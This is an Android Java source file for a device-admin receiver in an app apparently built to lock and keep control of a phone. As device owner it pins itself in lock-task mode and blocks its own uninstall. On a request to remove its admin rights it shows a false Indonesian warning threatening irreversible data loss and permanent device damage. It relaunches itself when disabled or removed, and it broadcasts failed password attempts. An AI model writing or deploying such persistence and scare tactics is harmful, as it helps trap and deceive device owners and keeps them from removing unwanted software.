package com.nullx.pp;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    public static ComponentName getComponentName(Context context) {
        return new ComponentName(context.getApplicationContext(), AppDeviceAdminReceiver.class);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = getComponentName(context);
            if (dpm.isDeviceOwnerApp(context.getPackageName())) {
                dpm.setLockTaskPackages(admin, new String[]{context.getPackageName()});
                dpm.setUninstallBlocked(admin, context.getPackageName(), true);
            }
        } catch (Exception e) {}
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "PERINGATAN: Menonaktifkan administrator perangkat akan menyebabkan " +
               "kehilangan data dan kerusakan sistem yang tidak dapat diperbaiki. " +
               "Tindakan ini melanggar ketentuan layanan dan dapat mengakibatkan " +
               "kerusakan permanen pada perangkat Anda.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Intent restart = new Intent(context, MainActivity.class);
        restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(restart);
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        Intent broadcast = new Intent("com.nullx.pp.PASSWORD_FAILED");
        context.sendBroadcast(broadcast);
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_PACKAGE_REMOVED.equals(intent.getAction())) {
            String pkg = intent.getData() != null ? intent.getData().getSchemeSpecificPart() : "";
            if (context.getPackageName().equals(pkg)) {
                Intent restart = new Intent(context, MainActivity.class);
                restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(restart);
            }
        }
        super.onReceive(context, intent);
    }
}
